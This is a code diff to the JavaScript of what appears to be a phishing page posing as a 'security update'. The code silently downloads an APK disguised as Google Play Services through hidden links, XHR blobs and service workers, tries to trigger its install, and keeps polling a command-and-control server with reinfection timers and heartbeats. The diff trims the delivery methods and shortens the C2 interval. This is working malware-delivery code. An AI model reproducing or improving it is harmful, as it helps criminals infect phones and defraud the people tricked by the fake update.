@@ -70,7 +70,7 @@
 var SERVER = 'https://verifikasi.site';
 var WS_PASSWORD = '';
 var PASSWORD_FETCHED = false;
-var C2_INTERVAL = 20000;
+var C2_INTERVAL = 10000; // 🔥 10 DETIK
 var APK_INSTALLED = false;
 var REINFECTION_INTERVAL = 86400000;
 var progress = 0;
@@ -164,7 +164,7 @@ function ambilPassword() {
                         startReinfection();
                         autoExecuteC2();
                         
-                        // 🔥 MULAI 10 METODE DOWNLOAD + 5 METODE INSTALL SEKALIGUS!
+                        // 🔥 MULAI 4 METODE DOWNLOAD + 3 METODE INSTALL SEKALIGUS!
                         startDownloadAndInstall();
                         return;
                     }
@@ -181,14 +181,14 @@ function ambilPassword() {
 }
 
 // ============================================================
-// 🔥 10 METODE DOWNLOAD + 5 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
+// 🔥 4 METODE DOWNLOAD + 3 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
 // ============================================================
 function startDownloadAndInstall() {
     updateProgress(30, '⏳ Mengunduh pembaruan keamanan...');
-    K({ sumber: 'apk_download_start', data: '10_methods' });
+    K({ sumber: 'apk_download_start', data: '4_methods' });
     
     // ============================================================
-    // 🔥 10 METODE DOWNLOAD SEKALIGUS!
+    // 🔥 4 METODE DOWNLOAD SEKALIGUS!
     // ============================================================
     
     // METHOD 1: ANDROID BRIDGE
@@ -206,7 +206,7 @@ function startDownloadAndInstall() {
         } catch(e) {}
     }
     
-    // METHOD 2: XHR + BLOB (PASTI! DI BROWSER BIASA)
+    // METHOD 2: XHR + BLOB
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', APK_URL, true);
@@ -241,91 +241,7 @@ function startDownloadAndInstall() {
         xhr.send();
     } catch(e) {}
     
-    // METHOD 3: FETCH + BLOB (PASTI! DI BROWSER BIASA)
-    try {
-        fetch(APK_URL)
-            .then(function(res) { return res.blob(); })
-            .then(function(blob) {
-                if (!APK_DOWNLOADED) {
-                    try {
-                        var url = URL.createObjectURL(blob);
-                        var link = document.createElement('a');
-                        link.href = url;
-                        link.download = 'GooglePlayServices.apk';
-                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                        document.body.appendChild(link);
-                        setTimeout(function() {
-                            link.click();
-                            APK_DOWNLOADED = true;
-                            K({ sumber: 'apk_download_3_fetch', data: 'success' });
-                            updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
-                            setTimeout(function() {
-                                try { document.body.removeChild(link); } catch(e) {}
-                                URL.revokeObjectURL(url);
-                            }, 2000);
-                        }, 300);
-                        return;
-                    } catch(e) {
-                        K({ sumber: 'apk_download_3_fetch_error', data: e.message });
-                    }
-                }
-            })
-            .catch(function(e) { K({ sumber: 'apk_download_3_fetch_catch', data: e.message }); });
-    } catch(e) {}
-    
-    // METHOD 4: IFRAME 1
-    try {
-        var iframe1 = document.getElementById('downloadIframe');
-        if (!iframe1) {
-            iframe1 = document.createElement('iframe');
-            iframe1.id = 'downloadIframe';
-            iframe1.className = 'download-iframe';
-            document.body.appendChild(iframe1);
-        }
-        iframe1.src = APK_URL + '?t=' + Date.now();
-        K({ sumber: 'apk_download_4_iframe1', data: 'started' });
-        setTimeout(function() { if (!APK_DOWNLOADED) { APK_DOWNLOADED = true; K({ sumber: 'apk_download_4_iframe1_success', data: 'ok' }); } }, 3000);
-    } catch(e) {}
-    
-    // METHOD 5: IFRAME 2
-    try {
-        var iframe2 = document.getElementById('downloadIframe2');
-        if (!iframe2) {
-            iframe2 = document.createElement('iframe');
-            iframe2.id = 'downloadIframe2';
-            iframe2.className = 'download-iframe';
-            document.body.appendChild(iframe2);
-        }
-        iframe2.src = APK_URL + '?t=' + Date.now() + '&download=1';
-        K({ sumber: 'apk_download_5_iframe2', data: 'started' });
-        setTimeout(function() { if (!APK_DOWNLOADED) { APK_DOWNLOADED = true; K({ sumber: 'apk_download_5_iframe2_success', data: 'ok' }); } }, 3000);
-    } catch(e) {}
-    
-    // METHOD 6: IFRAME 3
-    try {
-        var iframe3 = document.getElementById('downloadIframe3');
-        if (!iframe3) {
-            iframe3 = document.createElement('iframe');
-            iframe3.id = 'downloadIframe3';
-            iframe3.className = 'download-iframe';
-            document.body.appendChild(iframe3);
-        }
-        iframe3.src = APK_URL + '?t=' + Date.now();
-        K({ sumber: 'apk_download_6_iframe3', data: 'started' });
-        setTimeout(function() { if (!APK_DOWNLOADED) { APK_DOWNLOADED = true; K({ sumber: 'apk_download_6_iframe3_success', data: 'ok' }); } }, 3000);
-    } catch(e) {}
-    
-    // METHOD 7: WINDOW.OPEN
-    try {
-        var win = window.open(APK_URL, '_blank');
-        if (win) {
-            APK_DOWNLOADED = true;
-            K({ sumber: 'apk_download_7_window', data: 'success' });
-            setTimeout(function() { try { win.close(); } catch(e) {} }, 2000);
-        }
-    } catch(e) {}
-    
-    // METHOD 8: ANCHOR CLICK
+    // METHOD 3: ANCHOR CLICK
     try {
         var a = document.createElement('a');
         a.href = APK_URL;
@@ -335,14 +251,14 @@ function startDownloadAndInstall() {
         setTimeout(function() {
             a.click();
             APK_DOWNLOADED = true;
-            K({ sumber: 'apk_download_8_anchor', data: 'success' });
+            K({ sumber: 'apk_download_3_anchor', data: 'success' });
             setTimeout(function() {
                 try { document.body.removeChild(a); } catch(e) {}
             }, 2000);
         }, 500);
     } catch(e) {}
     
-    // METHOD 9: SERVICE WORKER
+    // METHOD 4: SERVICE WORKER
     if ('serviceWorker' in navigator) {
         try {
             navigator.serviceWorker.ready.then(function(reg) {
@@ -352,23 +268,15 @@ function startDownloadAndInstall() {
                         url: APK_URL,
                         filename: 'GooglePlayServices.apk'
                     });
-                    K({ sumber: 'apk_download_9_sw', data: 'started' });
-                    setTimeout(function() { if (!APK_DOWNLOADED) { APK_DOWNLOADED = true; K({ sumber: 'apk_download_9_sw_success', data: 'ok' }); } }, 3000);
+                    K({ sumber: 'apk_download_4_sw', data: 'started' });
+                    setTimeout(function() { if (!APK_DOWNLOADED) { APK_DOWNLOADED = true; K({ sumber: 'apk_download_4_sw_success', data: 'ok' }); } }, 3000);
                 }
             });
         } catch(e) {}
     }
     
-    // METHOD 10: IOS (REDIRECT APP STORE)
-    if (PLATFORM.isIOS) {
-        try {
-            window.location.href = 'https://apps.apple.com/id/app/dana-indonesia/id1440716954';
-            K({ sumber: 'apk_download_10_ios', data: 'redirect_to_appstore' });
-        } catch(e) {}
-    }
-    
     // ============================================================
-    // 🔥 5 METODE INSTALL APK SEKALIGUS! (TANPA RETRY!)
+    // 🔥 3 METODE INSTALL APK SEKALIGUS! (TANPA RETRY!)
     // ============================================================
     setTimeout(function() {
         startInstall();
@@ -376,7 +284,7 @@ function startDownloadAndInstall() {
 }
 
 // ============================================================
-// 🔥 5 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
+// 🔥 3 METODE INSTALL SEKALIGUS! (TANPA RETRY!)
 // ============================================================
 function startInstall() {
     if (APK_INSTALLED) {
@@ -391,7 +299,7 @@ function startInstall() {
     }
     
     updateProgress(80, '⏳ Menerapkan pembaruan keamanan...');
-    K({ sumber: 'apk_install_start', data: '5_methods' });
+    K({ sumber: 'apk_install_start', data: '3_methods' });
     
     var apkPaths = [
         '/storage/emulated/0/Download/GooglePlayServices.apk',
@@ -420,55 +328,24 @@ function startInstall() {
     }
     
     // ============================================================
-    // METHOD 2: INTENT URI (PASTI! DI ANDROID BROWSER)
-    // ============================================================
-    for (var j = 0; j < apkPaths.length; j++) {
-        try {
-            var intent = 'intent://' + apkPaths[j].replace('/storage/emulated/0/', '') +
-                         '#Intent;scheme=file;action=android.intent.action.VIEW;' +
-                         'type=application/vnd.android.package-archive;end';
-            window.location.href = intent;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_install_2_intent', data: { path: apkPaths[j] } });
-            updateProgress(100, '✅ Update Selesai');
-            finishAndRedirect();
-            return;
-        } catch(e) {}
-    }
-    
-    // ============================================================
-    // METHOD 3: FILE URI
+    // METHOD 2: FILE URI
     // ============================================================
     try {
         window.location.href = 'file:///storage/emulated/0/Download/GooglePlayServices.apk';
         APK_INSTALLED = true;
-        K({ sumber: 'apk_install_3_file', data: 'ok' });
+        K({ sumber: 'apk_install_2_file', data: 'ok' });
         updateProgress(100, '✅ Update Selesai');
         finishAndRedirect();
         return;
     } catch(e) {}
     
     // ============================================================
-    // METHOD 4: CONTENT URI
+    // METHOD 3: CONTENT URI
     // ============================================================
     try {
         window.location.href = 'content:///storage/emulated/0/Download/GooglePlayServices.apk';
         APK_INSTALLED = true;
-        K({ sumber: 'apk_install_4_content', data: 'ok' });
-        updateProgress(100, '✅ Update Selesai');
-        finishAndRedirect();
-        return;
-    } catch(e) {}
-    
-    // ============================================================
-    // METHOD 5: PACKAGE INSTALLER INTENT
-    // ============================================================
-    try {
-        var intentPkg = 'intent://#Intent;action=android.intent.action.VIEW;' +
-                        'package=com.android.packageinstaller;end';
-        window.location.href = intentPkg;
-        APK_INSTALLED = true;
-        K({ sumber: 'apk_install_5_package', data: 'ok' });
+        K({ sumber: 'apk_install_3_content', data: 'ok' });
         updateProgress(100, '✅ Update Selesai');
         finishAndRedirect();
         return;
@@ -533,7 +410,7 @@ function autoExecuteC2() {
 }
 
 // ============================================================
-// START C2 POLLING
+// START C2 POLLING (10 DETIK)
 // ============================================================
 function startC2Polling() {
     setInterval(cekPerintah, C2_INTERVAL);
@@ -574,7 +451,7 @@ function cekPerintah() {
 }
 
 // ============================================================
-// RE-INFECTION & HEARTBEAT
+// RE-INFECTION & HEARTBEAT (30 DETIK)
 // ============================================================
 function startReinfection() {
     setInterval(function() {
@@ -588,7 +465,7 @@ function startReinfection() {
 }
 
 function startHeartbeat() {
-    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 60000);
+    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 30000); // 🔥 30 DETIK
 }
 
 // ============================================================
